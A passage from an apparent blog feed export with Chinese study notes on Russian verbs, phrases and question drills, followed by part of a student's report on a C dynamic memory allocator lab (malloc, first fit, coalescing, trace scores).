(等待):</p><p>Мы тебя ждали вчера в аудитории.</p></li><li><p>петь (唱歌):</p><p>Мы поём русскую песню «Подмосковные вечера».</p></li><li><p>звать (招呼; 叫做)</p><p>Как тебя зовут? </p></li></ol><h4 id="非及物动词"><a href="#非及物动词" class="headerlink" title="非及物动词"></a>非及物动词</h4><ul><li>(第五课) работать, отдыхать, ужинать, играть, жить; </li><li>(第六课) говорить, хотеть, обедать, учиться;</li><li>(第七课) идти, ехать, разговаривать, мечтать, отвечать, заниматься;</li><li>(第八课) вставать, завтракать;</li><li>(第九课) лежать, быть, гулять, фотографироваться, собраться;</li><li>(第十课) сидеть, родиться;</li><li>(常用) стоять, лететь.</li></ul><ol><li><p>работать (工作):</p><p>работать на заводе; работать в Пекине; работать в Москве; работать на юге;</p></li><li><p>отдыхать (休息):</p><p>отдыхать дома; отдыхать на юге;</p></li><li><p>завтракать, обедать, ужинать (吃早 / 午 / 晚饭):</p><p>завтракать дома; обедать в кафе; ужинать  в институте; ужинать  в буфете (小吃部);</p></li><li><p>жить (居住):</p><p>жить дома; жить в институте; жить в Санкт-Петербурге;</p></li><li><p>играть (玩):</p><p>играть в футбол; играть в шахматы;</p></li><li><p>говорить (说):</p><p>говорить по-русски; говорить по-китайски;</p></li><li><p>хотеть (想):</p><p>хотеть читать стихи; хотеть смотреть телевизор; хотеть слушать музыку.</p></li><li><p>идти (步行): </p><p>Я иду на урок.</p></li><li><p>ехать (乘车):</p><p>Я еду на работу.</p></li><li><p>разговаривать (交谈):</p><p>Они разговаривают об учебе и о работе. Вы разговариваете о Москве?</p></li><li><p>мечтать (渴望):</p><p>мечтать учиться в России;  мечтать работать на юге;</p></li><li><p>отвечать (回答):</p><p>отвечать на вопросы;</p></li><li><p>стоять (站立):</p><p>На столе стоит красивая ваза.</p></li><li><p>лежать (放置):</p><p>На столе лежат книги и словари.</p></li><li><p>быть (曾经在):</p><p>Вчера вечером Антон и Нина были в театре.</p></li><li><p>гулять (散步):</p><p>Виктор и Анна гуляют в саду.</p></li><li><p>фотографироваться (摄像):</p><p>Они фотографируются в парке.</p></li><li><p>собраться (聚集):</p><p>Вчера мои товарищи собрались вместе. </p></li><li><p>сидеть (坐着):</p><p>Мы сидим в своей красивой аудитории. </p></li><li><p>родиться (出生):</p><p>Он родился в Пекине.</p></li></ol><h4 id="第一变位法"><a href="#第一变位法" class="headerlink" title="第一变位法"></a>第一变位法</h4><p><strong>正常变位</strong></p><ul><li>разговаривать, мечтать, отвечать, изучать, заниматься, покупать (购买), гулять.</li></ul><p><strong>特殊变位</strong></p><ul><li>писать: я пишу, ты пишешь, они пишут;</li><li>жить: я живу, ты живёшь, они живут;</li><li>звать: я зову, ты зовёшь, они зовут;</li><li>искать: я ищу, ты ищешь, они ищут;</li><li>идти: я иду, ты идёшь, они идут; </li><li>ехать: я еду, ты едешь, они едут;</li><li>вставать: я встаю, ты встаёшь, они встают.</li><li>танцевать: я танцую, ты танцуешь, они танцуют.  </li></ul><h4 id="第二变位法"><a href="#第二变位法" class="headerlink" title="第二变位法"></a>第二变位法</h4><p><strong>正常变位</strong></p><ul><li>говорить: я говорю, ты говоришь, они говорят;</li><li>стоять: я стою, ты стоишь, они стоят; </li><li>учить: я учу, ты учишь, они учат;</li><li>учиться: я учусь, ты учишься, они учатся;</li><li>смотреть: я смотрю, ты смотришь, они смотрят;</li></ul><p><strong>特殊变位</strong></p><ul><li>любить: я люблю, ты любишь, они любят.</li><li>лететь (飞行): я лечу, ты летишь, они летят.</li><li>сидеть: я сижу, ты сидишь, они сидят.</li></ul><h4 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h4><ul><li>говорить по-русски 俄语</li><li>говорить по-китайски 汉语</li><li>говорить по-английски 英语</li></ul><h4 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h4><ul><li>один час;</li><li>два / три / четыре часа;</li><li>пять / шесть / семь / восемь / девять / десять / одиннадцать / двенадцать часов.</li></ul><h4 id="星期"><a href="#星期" class="headerlink" title="星期"></a>星期</h4><ul><li>понедельник, вторник, среда, четверг, пятница, суббота, воскресенье.</li></ul><h4 id="月份"><a href="#月份" class="headerlink" title="月份"></a>月份</h4><ul><li>январь, февраль, март, апрель;</li><li>май, июнь, июль, август;</li><li>сентябрь, октябрь, ноябрь, декабрь.</li></ul><h4 id="第一至六课词组"><a href="#第一至六课词组" class="headerlink" title="第一至六课词组"></a>第一至六课词组</h4><ul><li>我 / 你 / 您 / 他 / 她叫… меня / тебя / вас / его / её зовут…</li><li>在喷泉旁 у фонтана</li><li>您的儿子 ваш сын</li><li>我的朋友 мой друг; моя подруга</li><li>你们的新房子 ваш новый дом</li><li>我的旧作业本 моя старая тетрадь</li><li>他的新车 его новая машина</li><li>我们的旧桌子 наш старый стол</li><li>你们的旧花园 ваш старый сад</li><li>他们的新护照 их новые паспорта</li><li>在工厂工作 работать на заводе</li><li>在学院里工作 работать в институте</li><li>在剧院里工作 работать в театре</li><li>懂俄语 знать русский язык</li><li>了解你 знать тебя</li><li>听音乐 слушать музыку</li><li>在南方休息  отдыхать на юге</li><li>在疗养院休息 отдыхать в санатории</li><li>在家休息 отдыхать дома</li><li>在家吃早餐 завтракать дома</li><li>在咖啡厅吃午餐 обедать в кафе</li><li>在小吃部吃晚餐 ужинать в буфете</li><li>在教室里做功课 делать урок в аудитории</li><li>在宿舍里做练习 делать упражнение в общежитии</li><li>踢足球 играть в футбол</li><li>下象棋 играть в шахматы</li><li>数香蕉 считать бананы</li><li>写生词 писать новые слова</li><li>住在莫斯科 жить в Москве</li><li>住在上海 жить в Шанхае</li><li>背单词 учить новые слова</li><li>渴望上大学 хотеть учиться в университете</li><li>渴望在俄罗斯留学 хотеть учиться в России</li><li>关于我 обо мне</li><li>3点钟 три часа</li><li>5点钟 пять часов</li><li>看电视 смотреть телевизор</li><li>看书 читать книгу</li><li>寻找教科书 искать учебник</li><li>请问 скажите пожалуйста</li><li>几点钟 который час</li><li>很好 очень хорошо</li></ul><h4 id="第七课词组"><a href="#第七课词组" class="headerlink" title="第七课词组"></a>第七课词组</h4><ol><li>俄语学院 Институт русского языка</li><li>学习研究俄语 изучать русский язык</li><li>在课堂上 на уроке </li><li>回答问题 отвечать на вопросы</li><li>做很多练习 делать упражнения</li><li>懂俄语 знать русский язык</li><li>谈论有关学习和生活的事情 разговаривать об учёбе и о жизни</li><li>学院里的生活 жизнь в институте</li><li>向往着留学俄罗斯 мечтать учиться в России</li><li>去上班 идти на работу </li><li>乘车去莫斯科 ехать в Москву</li><li>喜欢春天 любить весну</li><li>报刊和杂志 газета и журнал</li></ol><h4 id="第九课词组"><a href="#第九课词组" class="headerlink" title="第九课词组"></a>第九课词组</h4><ol><li>写生词 писать новые слова</li><li>看电视 смотреть телевизор</li><li>在教室里上自习 заниматься в аудитории</li><li>在宿舍休息 отдыхать в общежитии</li><li>好朋友  большие друзья (хорошие друзья)</li><li>喜欢数学 любить математику</li><li>做家庭作业 делать домашние задания</li><li>出行日 выходной день</li><li>弹吉他  играть на гитаре</li><li>乘车去听音乐会  ехать на концерт</li><li>看电影  смотреть фильм</li><li>好久没见到你 давно тебя не видеть</li><li>在学院里等你 ждать тебя в институте</li><li>上大学 учиться в университете</li><li>唱俄语歌 петь русские песни</li><li>在莫大学习 учиться в МГУ</li><li>中小学同学 школьные товарищи</li></ol><h4 id="第十课词组"><a href="#第十课词组" class="headerlink" title="第十课词组"></a>第十课词组</h4><ol><li>出生在莫斯科 родиться в Москве</li><li>在中学工作 работать в средней школе</li><li>大而美丽的城市 большой и красивый город</li><li>长江 река Янцзы</li><li>在童年 в детстве</li><li>在北大上学 учиться в Пекинском университете</li><li>俄罗斯语言与文学 русский язык и литература</li><li>每天 каждый день</li><li>除此以外 кроме того</li><li>听俄语诗歌 слушать русские стихи</li><li>好教师 хороший преподаватель</li><li>令人愉悦的和善良的人 весёлый и добрый человек</li><li>熟知故乡的城市 хорошо знать свой родной город</li><li>喜欢听他的故事 любить слушать его рассказы</li><li>著名的地方 знаменитые места</li><li>红场 Красная площадь</li><li>历史博物馆 Исторический музей</li><li>大剧院 Большой театр</li><li>冬宫 Зимний дворец</li><li>晚报 вечерняя газета</li><li>我的父母双亲 мои родители</li></ol><h4 id="重点词组"><a href="#重点词组" class="headerlink" title="重点词组"></a>重点词组</h4><ol><li>吃新鲜的菠萝 есть свежие ананасы</li><li>吃热汤 есть горячий суп</li><li>读书和报刊杂志 читать книгу, газету и журнал</li><li>听音乐 слушать музыку</li><li>在美丽的花园里散步 гулять в красивом саду</li><li>在周六  в субботу</li><li>谈论关于我的情况  разговаривать обо мне</li><li>乘公共汽车  ехать на автобусе</li><li>乘坐地铁  ехать на метро</li><li>谈论关于我的生活和工作  разговаривать о моей жизни и работе</li><li>飞往莫斯科 лететь в Москву</li><li>师范学院  педагогический институт</li><li>医学院  медицинский институт</li><li>历史系  исторический факультет</li><li>一年四季  времена года</li><li>站在喷泉旁 стоять у фонтана</li><li>背单词 учить новые слова</li><li>6点钟 шесть часов</li><li>唱歌跳舞 петь и танцевать</li><li>回忆起学校和老师同学 вспоминать о школе, об учителях и товарищах</li><li>高楼  большие дома</li><li>起床很早 вставать рано</li><li>他有课 у него уроки</li><li>购买蔬菜和苹果 покупать овощи и яблоки</li><li>回答问题 отвечать на вопросы</li><li>去上班 идти на работу</li><li>梦想在俄罗斯学习 мечтать учиться в России</li><li>美丽的花朵 красивые цветы</li><li>写信 писать письмо</li><li>在小吃部吃午饭 обедать в буфете</li></ol><h4 id="形容词"><a href="#形容词" class="headerlink" title="形容词"></a>形容词</h4><p><strong>硬变化</strong></p><ul><li>新的 новый, новая, новое, новые;</li><li>旧的 старый, старая, старое, старые;</li><li>美丽的 красивый, красивая, красивое, красивые;</li><li>美味的 вкусный, вкусная, вкусное, вкусные;</li><li>时尚的 модный, модная, модное, модные;</li><li>红色的 красный, красная, красное, красные;</li><li>学校的 школьный, школьная, школьное, школьные;</li><li>年青的 молодой, молодая, молодое, молодые; </li><li>大的 большой, большая, большое, большие; </li><li>不好的 плохой，плохая, плохое, плохие; </li><li>英国的  английский, английская, английское, английские; </li></ul><p><strong>软变化</strong></p><ul><li>家庭的 домашний, домашняя, домашнее, домашние; </li><li>蓝色的 синий, синяя, синее, синие; </li><li>晚上的 вечерний，вечерняя, вечернее, вечерние; </li><li>冬日的 зимний, зимняя, зимнее, зимние; </li><li>好的 хороший，хорошая, хорошее, хорошие; </li><li>新鲜的 свежий，свежая, свежее, свежие; </li><li>滚烫的 горячий, горячая, горячее, горячие. </li></ul><h4 id="на-固定词组-第四格"><a href="#на-固定词组-第四格" class="headerlink" title="на 固定词组 (第四格)"></a>на 固定词组 (第四格)</h4><p>на завод, на рынок, на мост, на работу, на урок, на лекцию, на выставку, на концерт, на почту, на кухню, на фирму, на улицу, на проспект, на стадион, на остановку автобуса, на обед, на ужин, на завтрак, на собрание, на юг, на вокзал, на футбол, на гору, на занятия, на факультет, на реку, на озеро, на поле, на море.</p><h4 id="об-固定词组-第六格"><a href="#об-固定词组-第六格" class="headerlink" title="об 固定词组 (第六格)"></a>об 固定词组 (第六格)</h4><p>обо мне, об учёбе, об аудитории, об общежитии, об уксусе, об автобусе, об остановке, об ухе, об яйце, об языке, об ужине, об Европе, об Азии, об имени, об Интернете, об отце, об юге, об овощах, об обуви, об обеде, об осени, об озере, об июле, об июне, об улице, об учителе, об учительнице, об январе, об апреле, об августе, об октябре.</p><h4 id="问答题"><a href="#问答题" class="headerlink" title="问答题"></a>问答题</h4><ol><li><p>Кто твой отец? </p><p>Мой отец инженер. Он работает на заводе.</p></li><li><p>Что стоит на столе? </p><p>На столе стоят красивые цветы.</p></li><li><p>Что ты читаешь? </p><p>Я читаю книгу и газету.</p></li><li><p>Что делала Инна вчера вечером? </p><p>Вчера вечером она смотрела телевизор.</p></li><li><p>Какой язык ты знаешь? </p><p>Я знаю китайский и русский языки.</p></li><li><p>Который час сейчас?</p><p>Сейчас два часа.</p></li><li><p>Куда они едут?</p><p>Они едут в Москву.</p></li><li><p>Когда ты встаёшь утром каждый день? </p><p>Каждый день утром я встаю в шесть часов.</p></li><li><p>Где Миша учился раньше? </p><p>Раньше он учился в Санкт-Петербурге.</p></li><li><p>Где Виктор был вчера? </p><p>Вчера он был в институте.</p></li><li><p>Чья это машина? </p><p>Это моя машина.</p></li><li><p>Какой сегодня день? </p><p>Сегодня понедельник.</p></li><li><p>Почему Анна много работает? </p><p>Она хочет учиться в России.</p></li><li><p>Какое время года ты любишь? </p><p>Я люблю весну и зиму.</p></li><li><p>Где учится твой брат? </p><p>Мой брат учится в МГУ.</p></li><li><p>Ребята хорошо знают о тебе? </p><p>Да, они хорошо знают обо мне.</p></li><li><p>О чём вы разговариваете? </p><p>Мы разговариваем об учёбе и о жизни в университете.</p></li><li><p>О ком рассказывал ваш преподаватель сегодня на уроке? </p><p>Сегодня на уроке он рассказывал о великом русском поэте Пушкине.</p></li><li><p>В каком городе ты живёшь? </p><p>Я живу в большом и красивом городе Шанхае.</p></li><li><p>Где вы родились?</p><p>Я родился в Москве.</p></li><li><p>Где вы учились раньше? </p><p>Раньше мы учились в школе.</p></li><li><p>Какой язык они учили в школе? </p><p>В школе они учили английский язык.</p></li><li><p>Как вы говорите по-русски? </p><p>Мы говорим по-русски очень хорошо.</p></li><li><p>Где обычно занимаются студенты? </p><p>Они обычно занимаются в аудиториях и библиотеках.</p></li><li><p>Какой язык изучает Виктор? </p><p>Он изучает китайский язык.</p></li><li><p>Что ты делал вчера вечером? </p><p>Вчера вечером я писал новые слова.</p></li><li><p>Кто такой Антон? </p><p>Антон хороший преподаватель, весёлый и добрый человек.</p></li><li><p>Какой ваш родной город?</p><p>Мой родной город — Пекин.</p></li><li><p>Ты любишь изучать русский язык? </p><p>Да, я люблю изучать русский язык.</p></li><li><p>Когда у вас уроки русского языка? </p><p>У нас уроки русского языка во вторник и в пятницу. </p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Russian </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Russian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 Lab 3</title>
      <link href="/2022/12/25/ji-suan-ji-xi-tong-gai-lun-lab-3/"/>
      <url>/2022/12/25/ji-suan-ji-xi-tong-gai-lun-lab-3/</url>
      
        <content type="html"><![CDATA[<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li>使用 $C$ 语言实现一个 $Dynamic$ $Storage$ $Allocater$.</li><li>实现并优化 $malloc$, $free$, $realloc$ 等功能.</li><li>熟练 $gdb$ 调试技巧.</li></ul><h2 id="最终性能"><a href="#最终性能" class="headerlink" title="最终性能"></a>最终性能</h2><p>在最终提交的版本中, 我对 $mm.c$ 的相关实现策略如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Data Structure -------- Explicit Free List <span class="token punctuation">(</span>Double Linked List<span class="token punctuation">)</span>  / Allocated Block --- Header, Payload and Footer  <span class="token punctuation">\</span> Free Block -------- Header, Pred_ptr, Succ_ptr and FooterFit Strategy ---------- First FitCoalesce Strategy ----- Immediate CoalesceRealloc Strategy ------ First Try to Coalesce, Then Try to Malloc and Free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终实现的性能如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">46</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">40</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">11</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">86</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Version-0"><a href="#Version-0" class="headerlink" title="Version 0"></a>Version 0</h2><p>$Version$ $0$ 为未作任何修改的原始 $mm.c$ 文件, 直接进行测试的结果.</p><h3 id="Block-Structure"><a href="#Block-Structure" class="headerlink" title="Block Structure"></a>Block Structure</h3><p>在原始 $mm.c$ 文件中, 一个 $block$ 没有 $header$ 或 $footer$ 标记, 也不会被 $coalesce$ 或 $reuse$.</p><h3 id="Helper-Functions"><a href="#Helper-Functions" class="headerlink" title="Helper Functions"></a>Helper Functions</h3><ul><li>没有实现任何 $helper$ $function$ 以辅助进行内存块的分配.</li><li>所有内存块不进行 $coalesce$, 经过 $free$ 后不会被 $malloc$ 或 $realloc$ 复用.</li></ul><h3 id="Malloc-Functions"><a href="#Malloc-Functions" class="headerlink" title="Malloc Functions"></a>Malloc Functions</h3><h4 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h4><ul><li>不进行 $init$, 直接返回.</li></ul><h4 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h4><ul><li>将 $size$ 对齐至 $16$ 字节, 直接调用 $mem_sbrk$ 申请新的堆区域, 并返回一个指向连续内存块的指针.</li></ul><h4 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free"></a>mm_free</h4><ul><li>不进行 $free$, 直接返回.</li></ul><h4 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h4><ul><li>直接调用 $mm_malloc$ 分配 $newptr$. </li><li>如果 $newptr$ 为 $NULL$, 此时堆可扩展内存不足, 直接返回 $NULL$.</li><li>否则, 依据大小关系将 $ptr$ 指向的旧内存块内容复制到 $newptr$ 指向的新块.</li></ul><h3 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:trace            name     valid  util     ops      secs   Kops <span class="token number">1</span>     amptjp-bal.rep       <span class="token function">yes</span>   <span class="token number">23</span>%    <span class="token number">5694</span>  <span class="token number">0.000070</span>  <span class="token number">81459</span> <span class="token number">2</span>       cccp-bal.rep       <span class="token function">yes</span>   <span class="token number">19</span>%    <span class="token number">5848</span>  <span class="token number">0.000072</span>  <span class="token number">81110</span> <span class="token number">3</span>    cp-decl-bal.rep       <span class="token function">yes</span>   <span class="token number">30</span>%    <span class="token number">6648</span>  <span class="token number">0.000084</span>  <span class="token number">78768</span> <span class="token number">4</span>       expr-bal.rep       <span class="token function">yes</span>   <span class="token number">40</span>%    <span class="token number">5380</span>  <span class="token number">0.000066</span>  <span class="token number">82137</span> <span class="token number">5</span> coalescing-bal.rep        no     -       -         -      - <span class="token number">6</span>     random-bal.rep        no     -       -         -      - <span class="token number">7</span>    random2-bal.rep        no     -       -         -      - <span class="token number">8</span>     binary-bal.rep       <span class="token function">yes</span>   <span class="token number">54</span>%   <span class="token number">12000</span>  <span class="token number">0.000144</span>  <span class="token number">83624</span> <span class="token number">9</span>    binary2-bal.rep       <span class="token function">yes</span>   <span class="token number">47</span>%   <span class="token number">24000</span>  <span class="token number">0.000186</span> <span class="token number">128755</span><span class="token number">10</span>    realloc-bal.rep        no     -       -         -      -<span class="token number">11</span>   realloc2-bal.rep        no     -       -         -      -Total                               -       -         -      -Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">12</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">40</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">6</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">28</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>此时实现的分配器尚不能正确实现所有任务.</p><p>$Kops$ 满足要求, 但 $Memory$ $Utilization$ 过低.</p></blockquote><h2 id="Version-1"><a href="#Version-1" class="headerlink" title="Version 1"></a>Version 1</h2><p>参考 $CSAPP3e$ : $9.9.12$ 中的实现, 采用 $Implicit$ $Free$ $List$ 组织空闲块.</p><h3 id="Block-Structure-1"><a href="#Block-Structure-1" class="headerlink" title="Block Structure"></a>Block Structure</h3><p>一个 $block$ 的结构被组织为:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958229.png" alt=""></p><p>考虑 $Boundary$ $Tags$ 与 $Alignment$ 条件, 此时 $minimum$ $block$ $size$ 为 $4 * WSIZE\,(32\,Bytes)$.</p><p>$Implicit$ $Free$ $List$ 被组织为:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958230.png" alt=""></p><p>其中 $heap_listp$ 初始默认指向 $Prologue$ $Block$, 而 $Epilogue$ $Block$ 在进行 $coalesce$ 时可以用于消除边界条件.</p><h3 id="Macros"><a href="#Macros" class="headerlink" title="Macros"></a>Macros</h3><p>相关 $Macro$ $Definition$ 完全参考了 $CSAPP3e$ : $9.9.12$ 中的实现.</p><h3 id="Helper-Functions-1"><a href="#Helper-Functions-1" class="headerlink" title="Helper Functions"></a>Helper Functions</h3><h4 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">first_fit</span><span class="token punctuation">(</span>size_t asize<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>bp <span class="token operator">=</span> heap_lo<span class="token punctuation">;</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> asize<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>采用 $first$ $fit$ 查询 $free$ $block$, 其中 $heap_lo$ 为定义的 $Implicit$ $Free$ $List$ 的起始地址.</li><li>若 $no$ $fit$, 则返回 $NULL$.</li></ul><h4 id="place"><a href="#place" class="headerlink" title="place"></a>place</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> size_t asize<span class="token punctuation">)</span> <span class="token punctuation">{</span>  size_t size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">-</span> asize<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size <span class="token operator">-</span> asize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size <span class="token operator">-</span> asize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>   <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将大小为 $asize$ 的块放置在 $bp$ 指向的 $free$ $block$ 处. </li><li>由于 $minimum$ $block$ $size$ 为 $4 * WSIZE$, 若剩余 $payloader$ 的 $size$ 过大, 则进行 $split$ 操作产生一个新的 $free$ $block$.</li></ul><h4 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span> <span class="token punctuation">{</span>  size_t prev_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size_t next_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size_t size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">/* Case 1 */</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>next_alloc<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment">/* Case 2 */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment">/* Case 3 */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token comment">/* Case 4 */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>采用 $immediate$ $coalesce$ 策略.</li><li>使用 $header$, $footer$ 作为 $boundary$ 